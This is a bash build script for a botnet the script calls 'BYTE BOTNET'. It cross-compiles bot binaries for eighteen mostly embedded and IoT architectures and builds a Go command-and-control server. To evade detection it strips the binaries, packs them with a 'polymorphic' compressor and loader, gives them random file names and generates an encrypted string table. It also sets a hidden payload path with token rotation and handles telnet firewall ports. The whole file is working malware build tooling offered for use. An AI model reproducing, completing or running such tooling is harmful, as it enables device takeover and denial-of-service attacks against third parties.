#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

MODE="release"
ACTION="build"
TARGET_ARCH=""
DO_STRIP=true
DO_PACK=true
DO_CNC=true
VERBOSE=false
DRY_RUN=false

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CNC_DIR="$SCRIPT_DIR/cnc"
BOT_DIR="$SCRIPT_DIR/bot"
RELEASE_DIR="$HOME/release"
BINS_DIR="$RELEASE_DIR/bins"

ARCHS=(
    "i486"
    "i586"
    "i686"
    "mips"
    "mipsel"
    "powerpc"
    "sh4"
    "armv4l"
    "armv5l"
    "armv6l"
    "armv7l"
    "aarch64"
    "x86_64"
    "m68k"
    "mips64"
    "mips64el"
    "s390x"
    "riscv64"
)

# ── Logging ──────────────────────────────────────────────

log_info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[OK]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error()   { echo -e "${RED}[ERROR]${NC} $1"; }
log_debug()   { [ "$VERBOSE" = true ] && echo -e "${CYAN}[DEBUG]${NC} $1"; }

# ── Helpers ──────────────────────────────────────────────

gen_random_string() {
    local length=${1:-16}
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w "$length" | head -n 1
}

# ── show_help ────────────────────────────────────────────

show_help() {
    echo -e "${CYAN}BYTE BOTNET BUILD SYSTEM${NC}"
    echo ""
    echo "Usage: ./build.sh [MODE] [OPTIONS]"
    echo ""
    echo -e "${WHITE}Modes (mutually exclusive):${NC}"
    echo "  --release      Build optimized, stripped, compressed (default)"
    echo "  --debug        Build with debug symbols, no optimization"
    echo "  --clean        Remove all build artifacts"
    echo "  --shutdown     Stop services, close ports, full cleanup"
    echo "  --status       Show current service status"
    echo ""
    echo -e "${WHITE}Options:${NC}"
    echo "  --arch <name>  Build single architecture"
    echo "  --no-strip     Skip binary stripping"
    echo "  --no-pack      Skip BLZ compression"
    echo "  --no-cnc       Skip CNC server build"
    echo "  --verbose      Show detailed output"
    echo "  --dry-run      Show what would be done"
    echo "  --help         Show this help"
    echo ""
    echo -e "${WHITE}Examples:${NC}"
    echo "  ./build.sh --release                  Build all archs"
    echo "  ./build.sh --release --arch x86_64     Build single arch"
    echo "  ./build.sh --debug --arch mips         Debug build, single arch"
    echo "  ./build.sh --clean                     Remove all artifacts"
    echo "  ./build.sh --status                    Show service status"
    echo ""
    echo -e "${WHITE}Notes:${NC}"
    echo "  Loader script + token rotation are handled by the CNC server."
    echo "  After building, start the CNC server to serve payloads."
    echo ""
    echo -e "${WHITE}Available architectures:${NC}"
    echo "  ${ARCHS[*]}"
    echo ""
}

# ── show_status ──────────────────────────────────────────

show_status() {
    echo -e "${WHITE}=== SERVICE STATUS ===${NC}"
    echo ""

    if pgrep -f "server" > /dev/null 2>&1; then
        echo -e "CNC Server:    ${GREEN}● Running${NC}"
        pgrep -f "server" | while read pid; do
            echo -e "               PID: $pid"
        done
    else
        echo -e "CNC Server:    ${RED}○ Stopped${NC}"
    fi

    echo ""
    echo -e "${WHITE}=== LISTENING PORTS ===${NC}"
    if command -v ss &> /dev/null; then
        ss -tlnp 2>/dev/null | grep -E "(LISTEN)" | head -10 || echo "No listening ports found"
    elif command -v netstat &> /dev/null; then
        netstat -tlnp 2>/dev/null | grep -E "(LISTEN)" | head -10 || echo "No listening ports found"
    fi

    echo ""
    echo -e "${WHITE}=== BUILD ARTIFACTS ===${NC}"
    if [ -d "$BINS_DIR" ]; then
        local count=$(ls -1 "$BINS_DIR" 2>/dev/null | wc -l)
        echo -e "Binaries:      ${GREEN}$count files${NC} in $BINS_DIR"
    else
        echo -e "Binaries:      ${YELLOW}Not built${NC}"
    fi

    if [ -f "$HOME/server" ]; then
        echo -e "CNC Binary:    ${GREEN}● Present${NC} at ~/server"
    else
        echo -e "CNC Binary:    ${YELLOW}○ Not built${NC}"
    fi

    if [ -f "$HOME/payload_info.txt" ]; then
        echo ""
        echo -e "${WHITE}=== LAST DEPLOYMENT INFO ===${NC}"
        cat "$HOME/payload_info.txt" | head -15
    fi

    echo ""
}

# ── do_clean ─────────────────────────────────────────────

do_clean() {
    echo -e "${WHITE}Cleaning build artifacts...${NC}"

    if [ "$DRY_RUN" = true ]; then
        log_info "[DRY-RUN] Would remove: $RELEASE_DIR, ~/server, ~/payload_info.txt, BLZ tools"
        return
    fi

    [ -d "$RELEASE_DIR" ] && rm -rf "$RELEASE_DIR" && log_success "Removed $RELEASE_DIR"
    [ -f "$HOME/server" ] && rm -f "$HOME/server" && log_success "Removed ~/server"
    [ -f "$HOME/payload_info.txt" ] && rm -f "$HOME/payload_info.txt" && log_success "Removed ~/payload_info.txt"

    if [ -d "$SCRIPT_DIR/tools/blz" ]; then
        make -C "$SCRIPT_DIR/tools/blz" clean >/dev/null 2>&1 || true
        rm -f "$SCRIPT_DIR/tools/packer/gen_config" 2>/dev/null || true
        rm -f "$SCRIPT_DIR/tools/packer/compress_payload" 2>/dev/null || true
        log_success "Cleaned BLZ tools"
    fi

    rm -rf /tmp/byte_* 2>/dev/null || true
    log_success "Clean completed"
}

# ── do_shutdown ──────────────────────────────────────────

do_shutdown() {
    echo -e "${WHITE}Initiating full shutdown...${NC}"

    if [ "$DRY_RUN" = true ]; then
        log_info "[DRY-RUN] Would stop CNC, remove artifacts, close firewall ports"
        return
    fi

    echo ""
    echo -e "${BLUE}[1/4]${NC} Stopping CNC server..."
    pkill -f "server" 2>/dev/null && log_success "CNC server stopped" || log_warning "No CNC server running"

    echo -e "${BLUE}[2/4]${NC} Removing build artifacts..."
    rm -rf "$RELEASE_DIR" 2>/dev/null || true
    rm -f "$HOME/server" 2>/dev/null || true
    rm -f "$HOME/payload_info.txt" 2>/dev/null || true
    log_success "Build artifacts removed"

    echo -e "${BLUE}[3/4]${NC} Closing firewall ports..."
    if command -v ufw &> /dev/null; then
        sudo ufw deny 23/tcp 2>/dev/null || true
        sudo ufw deny 2323/tcp 2>/dev/null || true
        sudo ufw deny 48101/tcp 2>/dev/null || true
        log_success "Firewall ports closed (ufw)"
    elif command -v iptables &> /dev/null; then
        sudo iptables -D INPUT -p tcp --dport 23 -j ACCEPT 2>/dev/null || true
        sudo iptables -D INPUT -p tcp --dport 2323 -j ACCEPT 2>/dev/null || true
        sudo iptables -D INPUT -p tcp --dport 48101 -j ACCEPT 2>/dev/null || true
        log_success "Firewall rules removed (iptables)"
    else
        log_warning "No firewall tool found"
    fi

    echo -e "${BLUE}[4/4]${NC} Cleaning temp files..."
    rm -rf /tmp/byte_* 2>/dev/null || true
    make -C "$SCRIPT_DIR/tools/blz" clean >/dev/null 2>&1 || true
    rm -f "$SCRIPT_DIR/tools/blz/blz_config.h" 2>/dev/null || true
    rm -f "$SCRIPT_DIR/tools/packer/gen_config" 2>/dev/null || true
    rm -f "$SCRIPT_DIR/tools/packer/compress_payload" 2>/dev/null || true
    log_success "Temp files cleaned"

    echo ""
    log_success "All services stopped and cleaned up"
}

# ── build_cnc ────────────────────────────────────────────

build_cnc() {
    if [ "$DO_CNC" = false ]; then
        log_info "Skipping CNC build (--no-cnc)"
        return
    fi

    echo -e "${WHITE}Building CNC server...${NC}"

    if [ ! -d "$CNC_DIR" ]; then
        log_error "CNC directory not found: $CNC_DIR"
        return 1
    fi

    if [ "$DRY_RUN" = true ]; then
        log_info "[DRY-RUN] Would build CNC server"
        return
    fi

    cd "$CNC_DIR"

    if [ "$MODE" = "debug" ]; then
        go build -gcflags="all=-N -l" -o server
        log_debug "Built with debug flags"
    else
        go build -ldflags="-s -w" -o server
        log_debug "Built with release flags"
    fi

    mv "$CNC_DIR/server" "$HOME/"
    cd "$SCRIPT_DIR"

    log_success "CNC server built: ~/server"
}

# ── Compiler helpers ─────────────────────────────────────

get_compiler_flags() {
    local arch="$1"
    local flags="-std=c99 -O0 -fno-strict-aliasing -fwrapv -fsigned-char -fomit-frame-pointer -D_GNU_SOURCE"

    if [ "$arch" != "sh4" ]; then
        flags="$flags -fdata-sections -ffunction-sections"
        flags="$flags -Wl,--gc-sections"
        if [ "$MODE" != "debug" ]; then
            flags="$flags -flto -ffat-lto-objects"
        fi
    fi

    flags="$flags -fvisibility=hidden -fno-ident"
    flags="$flags -Wl,-z,relro -Wl,-z,now -Wl,--build-id=none"
    flags="$flags -static"

    [ "$arch" = "riscv64" ] && flags="$flags -fno-PIC -fno-PIE -no-pie"
    [ "$MODE" = "debug" ] && flags="$flags -DDEBUG=1"

    echo "$flags"
}

get_compiler_name() {
    local arch="$1"
    case "$arch" in
        i486|i586|i686) echo "i686-linux-musl-gcc" ;;
        mips)           echo "mips-linux-musl-gcc" ;;
        mipsel)         echo "mipsel-linux-musl-gcc" ;;
        powerpc)        echo "powerpc-linux-musl-gcc" ;;
        sh4)            echo "sh4-linux-musl-gcc" ;;
        m68k)           echo "m68k-linux-musl-gcc" ;;
        mips64)         echo "mips64-linux-musl-gcc" ;;
        mips64el)       echo "mips64el-linux-musl-gcc" ;;
        s390x)          echo "s390x-linux-musl-gcc" ;;
        riscv64)        echo "riscv64-linux-musl-gcc" ;;
        armv4l|armv5l|armv6l|armv7l) echo "arm-linux-musleabi-gcc" ;;
        aarch64)        echo "aarch64-linux-gnu-gcc" ;;
        x86_64)         echo "x86_64-linux-musl-gcc" ;;
        *)              echo "unknown-compiler" ;;
    esac
}

get_arch_flags() {
    local arch="$1"
    case "$arch" in
        i486)    echo "-march=i486 -mtune=generic" ;;
        i586)    echo "-march=i586 -mtune=generic" ;;
        i686)    echo "-march=i686 -mtune=generic" ;;
        armv4l)  echo "-march=armv4 -mabi=aapcs-linux" ;;
        armv5l)  echo "-march=armv5t -mabi=aapcs-linux" ;;
        armv6l)  echo "-march=armv6 -mabi=aapcs-linux -mfloat-abi=softfp" ;;
        armv7l)  echo "-march=armv7-a -mabi=aapcs-linux -mfloat-abi=softfp" ;;
        aarch64) echo "-march=armv8-a -mstrict-align" ;;
        *)       echo "" ;;
    esac
}

# ── build_bot ────────────────────────────────────────────

build_bot() {
    local arch="$1"
    local output_name="$2"
    local output_path="${BINS_DIR}/${output_name}"

    local compiler=$(get_compiler_name "$arch")
    local arch_flags=$(get_arch_flags "$arch")

    if ! command -v "$compiler" &> /dev/null; then
        log_error "Compiler not found: $compiler (for $arch)"
        return 1
    fi

    log_debug "Arch: $arch | Compiler: $compiler | Flags: $arch_flags"

    if [ "$DRY_RUN" = true ]; then
        log_info "[DRY-RUN] Would compile $arch -> $output_name"
        return 0
    fi

    local flags=$(get_compiler_flags "$arch")
    local tmp_log="/tmp/build_${arch}.log"

    local bearssl_build="$SCRIPT_DIR/tools/bearssl-build/${arch}"
    local bearssl_flags=""
    local source_files="$BOT_DIR/*.c $BOT_DIR/methods/*.c"
    if [ -f "${bearssl_build}/lib/libbearssl.a" ]; then
        bearssl_flags="-I${bearssl_build}/inc -L${bearssl_build}/lib -lbearssl -DHAVE_BEARSSL"
        log_debug "BearSSL found for $arch"
    else
        source_files="$BOT_DIR/*.c $(ls $BOT_DIR/methods/*.c | grep -v https_method.c | tr '\n' ' ')"
        log_debug "BearSSL NOT found for $arch — HTTPS excluded"
    fi

    local build_cmd="$compiler $flags $arch_flags $source_files -o $output_path -lpthread $bearssl_flags -DBArch=\"$arch\""

    if [ "$VERBOSE" = true ]; then
        $build_cmd
    else
        $build_cmd > "$tmp_log" 2>&1
    fi

    local result=$?

    if [ $result -ne 0 ] && [ "$VERBOSE" = false ]; then
        echo ""
        log_error "Build failed for $arch:"
        cat "$tmp_log"
    fi

    rm -f "$tmp_log" 2>/dev/null
    return $result
}

# ── strip_binary ─────────────────────────────────────────

strip_binary() {
    local arch="$1"
    local binary_path="$2"

    [ "$DO_STRIP" = false ] && return
    [ "$DRY_RUN" = true ] && { log_info "[DRY-RUN] Would strip $binary_path"; return; }

    local compiler=$(get_compiler_name "$arch")
    local strip_tool="${compiler%-gcc}-strip"

    if ! command -v "$strip_tool" &> /dev/null; then
        if ! command -v strip &> /dev/null; then
            log_warning "Strip tool not found: $strip_tool"
            return
        fi
        log_warning "Using generic strip for $arch (may not work correctly)"
        strip_tool="strip"
    fi

    "$strip_tool" "$binary_path" -S --strip-unneeded \
        --strip-all \
        --remove-section=.note.gnu.gold-version \
        --remove-section=.comment \
        --remove-section=.note \
        --remove-section=.note.gnu.build-id \
        --remove-section=.note.ABI-tag \
        --remove-section=.jcr \
        --remove-section=.got.plt \
        --remove-section=.eh_frame \
        --remove-section=.eh_frame_ptr \
        --remove-section=.eh_frame_hdr 2>/dev/null || true

    log_debug "Stripped: $binary_path"
}

# ── pack_binary ──────────────────────────────────────────

pack_binary() {
    local arch="$1"
    local bin_name="$2"
    local bin_path="${BINS_DIR}/${bin_name}"

    [ "$DO_PACK" = false ] && { log_debug "Skipping pack (--no-pack)"; return 0; }

    if [ "$DRY_RUN" = true ]; then
        log_info "[DRY-RUN] Would pack $bin_name"
        return 0
    fi

    local packer_dir="$SCRIPT_DIR/tools/packer"
    local blz_dir="$SCRIPT_DIR/tools/blz"
    local compressor_tool="$packer_dir/compress_payload"
    local gen_tool="$packer_dir/gen_config"

    # Build gen_config if needed
    if [ ! -x "$gen_tool" ]; then
        log_debug "Building gen_config tool..."
        gcc -O2 -o "$gen_tool" "$packer_dir/gen_config.c"
        if [ $? -ne 0 ]; then
            log_error "Failed to build gen_config tool"
            return 1
        fi
    fi

    # Generate BLZ config if needed
    if [ ! -f "$blz_dir/blz_config.h" ] || [ ! -x "$compressor_tool" ]; then
        log_debug "Generating polymorphic BLZ config..."
        "$gen_tool" "$blz_dir/blz_config.h"
        if [ $? -ne 0 ]; then
            log_error "Failed to generate BLZ config"
            return 1
        fi
        rm -f "$compressor_tool" 2>/dev/null
    fi

    # Build compressor if needed
    if [ ! -x "$compressor_tool" ]; then
        log_debug "Building compressor tool..."
        gcc -O3 -fvisibility=hidden -fno-ident \
            -I"$blz_dir" "$packer_dir/compress_payload.c" "$blz_dir/blz.c" \
            -o "$compressor_tool"
        if [ $? -ne 0 ]; then
            log_error "Failed to build compressor tool"
            return 1
        fi
    fi

    log_debug "Packing binary for $arch..."

    local raw_bin="${bin_path}.raw"
    local packed_payload="${bin_path}.packed"
    local loader_bin="${bin_path}.loader"

    mv "$bin_path" "$raw_bin"

    "$compressor_tool" "$raw_bin" "$packed_payload"
    if [ $? -ne 0 ]; then
        log_error "Compression failed"
        mv "$raw_bin" "$bin_path"
        return 1
    fi

    local compiler=$(get_compiler_name "$arch")
    local arch_flags=$(get_arch_flags "$arch")

    local debug_flag=""
    [ "$MODE" = "debug" ] && debug_flag="-DDEBUG"

    local build_loader_cmd="$compiler $arch_flags -O0 -fno-strict-aliasing -fwrapv -fsigned-char -static -fno-ident -fno-asynchronous-unwind-tables \
            -ffunction-sections -fdata-sections -Wl,--gc-sections -fvisibility=hidden -D_GNU_SOURCE $debug_flag \
            -I\"$blz_dir\" \"$packer_dir/loader.c\" \"$blz_dir/blz.c\" -o \"$loader_bin\""

    if [ "$VERBOSE" = true ]; then
        eval $build_loader_cmd
    else
        eval $build_loader_cmd >/dev/null 2>&1
    fi

    if [ $? -ne 0 ]; then
        log_error "Failed to compile loader for $arch, keeping original"
        mv "$raw_bin" "$bin_path"
        return 1
    fi

    strip_binary "$arch" "$loader_bin"

    cp "$loader_bin" "$bin_path"
    cat "$packed_payload" >> "$bin_path"
    chmod +x "$bin_path"

    local new_size=$(ls -lh "$bin_path" | awk '{print $5}')
    log_debug "Packed: $new_size"

    rm -f "$raw_bin" "$packed_payload" "$loader_bin"
}

# ── build_all ────────────────────────────────────────────

build_all() {
    echo -e "${WHITE}Build Configuration:${NC}"
    echo -e "  Mode:      ${CYAN}$MODE${NC}"
    echo -e "  Target:    ${CYAN}${TARGET_ARCH:-all architectures}${NC}"
    echo -e "  Strip:     ${CYAN}$DO_STRIP${NC}"
    echo -e "  Pack:      ${CYAN}$DO_PACK${NC}"
    echo -e "  CNC:       ${CYAN}$DO_CNC${NC}"
    echo ""

    mkdir -p "$RELEASE_DIR"
    mkdir -p "$BINS_DIR"

    build_cnc
    echo ""

    # Resolve target architectures
    local archs_to_build=()
    if [ -n "$TARGET_ARCH" ]; then
        local valid=false
        for arch in "${ARCHS[@]}"; do
            [ "$arch" = "$TARGET_ARCH" ] && valid=true && break
        done
        if [ "$valid" = false ]; then
            log_error "Invalid architecture: $TARGET_ARCH"
            log_info "Available: ${ARCHS[*]}"
            exit 1
        fi
        archs_to_build=("$TARGET_ARCH")
    else
        archs_to_build=("${ARCHS[@]}")
    fi

    # BearSSL pre-check
    local bearssl_missing=0
    for arch in "${archs_to_build[@]}"; do
        [ ! -f "$SCRIPT_DIR/tools/bearssl-build/${arch}/lib/libbearssl.a" ] && ((bearssl_missing++))
    done
    [ $bearssl_missing -gt 0 ] && log_warning "BearSSL missing for $bearssl_missing arch(es) — HTTPS excluded. Run: bash tools/build_bearssl.sh"

    # Generate random binary names
    declare -A BINARY_NAMES
    for arch in "${archs_to_build[@]}"; do
        BINARY_NAMES[$arch]=$(gen_random_string 10)
    done

    touch "$RELEASE_DIR/binary_map.txt"

    # Generate string table
    echo -e "${WHITE}Generating polymorphic string table...${NC}"
    local secrets_file="$SCRIPT_DIR/tools/enc/secrets.txt"
    if [ ! -f "$secrets_file" ]; then
        log_error "Missing $secrets_file — copy tools/enc/secrets.example.txt and fill in your values."
        exit 1
    fi
    cd "$SCRIPT_DIR/tools"
    go run ./enc -secrets "$secrets_file" > "$BOT_DIR/table.c"
    if [ $? -ne 0 ]; then
        log_error "Failed to generate table.c"
        exit 1
    fi
    cd "$SCRIPT_DIR"
    echo ""

    # Build loop
    echo -e "${WHITE}Building bot binaries...${NC}"
    echo ""

    local total=${#archs_to_build[@]}
    local current=0
    local success=0
    local failed=0

    for arch in "${archs_to_build[@]}"; do
        ((current++))
        local bin_name="${BINARY_NAMES[$arch]}"
        echo -ne "${BLUE}[${current}/${total}]${NC} $arch -> $bin_name ... "

        if build_bot "$arch" "$bin_name"; then
            strip_binary "$arch" "${BINS_DIR}/${bin_name}"
            chmod +x "${BINS_DIR}/${bin_name}" 2>/dev/null || true
            local size=$(ls -lh "${BINS_DIR}/${bin_name}" 2>/dev/null | awk '{print $5}')
            echo -ne "${GREEN}OK${NC} ($size) "

            pack_binary "$arch" "$bin_name"
            if [ $? -eq 0 ]; then
                local packed_size=$(ls -lh "${BINS_DIR}/${bin_name}" 2>/dev/null | awk '{print $5}')
                echo -e "-> Packed: ${GREEN}$packed_size${NC}"
                ((success++))

                sed -i "/^${arch}=/d" "$RELEASE_DIR/binary_map.txt" 2>/dev/null || true
                echo "${arch}=${bin_name}" >> "$RELEASE_DIR/binary_map.txt"
            else
                echo -e "-> ${RED}Pack Failed${NC}"
                rm -f "${BINS_DIR}/${bin_name}"
                ((failed++))
            fi
        else
            echo -e "${RED}FAILED${NC}"
            ((failed++))
        fi
    done

    echo ""
    log_info "Build results: ${GREEN}$success success${NC}, ${RED}$failed failed${NC}"

    if [ $success -gt 0 ]; then
        echo ""
        update_config
    fi
}

# ── update_config ────────────────────────────────────────
# Updates config.json with bins_directory and hidden_path.
# Loader script generation + token rotation is handled by the CNC server.

update_config() {
    local CONFIG_FILE="$SCRIPT_DIR/config/config.json"

    if [ "$DRY_RUN" = true ]; then
        log_info "[DRY-RUN] Would update config.json"
        return
    fi

    if command -v jq &> /dev/null; then
        # Preserve existing hidden_path and loader_name — only generate if empty
        local EXISTING_PATH=$(jq -r '.payload.hidden_path // ""' "$CONFIG_FILE")
        local EXISTING_LOADER=$(jq -r '.payload.loader_name // ""' "$CONFIG_FILE")
        local HIDDEN_PATH="${EXISTING_PATH:-$(gen_random_string 12)}"
        local LOADER_NAME="${EXISTING_LOADER:-$(gen_random_string 6)}"

        local TEMP_CONFIG=$(mktemp)
        jq --arg bins "$BINS_DIR" \
           --arg path "$HIDDEN_PATH" \
           --arg loader "$LOADER_NAME" \
           '.payload.enabled = true | .payload.bins_directory = $bins | .payload.hidden_path = $path | .payload.loader_name = $loader | .payload.token_enabled = true' \
           "$CONFIG_FILE" > "$TEMP_CONFIG" && mv "$TEMP_CONFIG" "$CONFIG_FILE"
        log_success "Config updated: bins=$BINS_DIR, hidden_path=/$HIDDEN_PATH/, loader=$LOADER_NAME"
    else
        log_warning "jq not installed — update config/config.json manually"
        log_info "Set payload.bins_directory = $BINS_DIR"
    fi

    echo ""
    log_info "Loader script + token rotation handled by CNC server on startup"
    log_info "Start CNC: source ~/.env.cnc && cd ~/ && ./server"
}

# ── parse_args ───────────────────────────────────────────

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --debug)     MODE="debug"; DO_STRIP=false ;;
            --release)   MODE="release" ;;
            --clean)     ACTION="clean" ;;
            --shutdown)  ACTION="shutdown" ;;
            --status)    ACTION="status" ;;
            --arch)      TARGET_ARCH="$2"; shift ;;
            --no-strip)  DO_STRIP=false ;;
            --no-pack)   DO_PACK=false ;;
            --no-cnc)    DO_CNC=false ;;
            --verbose|-v) VERBOSE=true ;;
            --dry-run)   DRY_RUN=true ;;
            --help|-h)   show_help; exit 0 ;;
            *)           log_error "Unknown option: $1"; exit 1 ;;
        esac
        shift
    done
}

# ── main ─────────────────────────────────────────────────

main() {
    parse_args "$@"

    [ "$DRY_RUN" = true ] && log_warning "DRY-RUN MODE — no changes will be made" && echo ""

    case "$ACTION" in
        clean)    do_clean ;;
        shutdown) do_shutdown ;;
        status)   show_status ;;
        build)    build_all ;;
    esac
}

main "$@"
